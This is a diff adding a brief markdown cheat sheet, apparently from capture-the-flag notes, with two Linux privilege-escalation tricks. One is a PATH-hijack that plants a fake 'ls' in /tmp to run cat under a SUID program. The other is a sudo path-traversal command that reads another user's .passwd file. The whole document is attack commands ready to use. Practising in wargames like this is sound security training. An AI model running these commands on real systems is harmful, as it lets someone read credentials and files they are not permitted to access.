@@ -1,0 +1,9 @@
+## SUID Shell Scripts
+
+echo '#!/bin/sh' > /tmp/ls; echo '/bin/cat $1' >> /tmp/ls; /bin/chmod +x /tmp/ls
+export PATH=/tmp:$PATH
+./<program_name>
+
+## weak sudo
+
+sudo -u <user> cat /challenge/<my_user>/<path_with_access>/../<other_path>/.passwd
